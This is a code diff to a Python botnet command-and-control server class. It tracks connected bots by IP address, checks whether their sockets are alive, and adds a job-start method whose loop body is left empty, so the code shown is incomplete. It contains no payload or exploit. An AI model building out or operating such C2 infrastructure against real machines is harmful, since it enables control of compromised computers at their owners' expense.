@@ -1,15 +1,34 @@
 import threading
 import concurrent.futures
 
-import botnet_exceptions
+from botnet_exceptions import *
 
 
 class C2server():
 
-    def __init__(self, user_id, bot_socket):
+    def __init__(self, user_id, bot):
         self.user_id = user_id
-        self.bots = [bot_socket]
+        self.bots = {bot.address[0]: bot}
         self.event_state = threading.Event()
+
+    def start_job(self, command_id):
+        if not self.are_bots_online():
+            raise NoBotsException()
+
+        for bot in self.bots:
+
+
+
+    def are_bots_online(self):
+        if not self.bots:
+            return False
+        online_bots = 0
+        for bot_address, bot in self.bots.items():
+            if self.is_socket_alive(bot.bot_socket):
+                online_bots += 1
+        if online_bots == 0:
+            return False
+        return True
     
     def execute_command(self, command):
         """
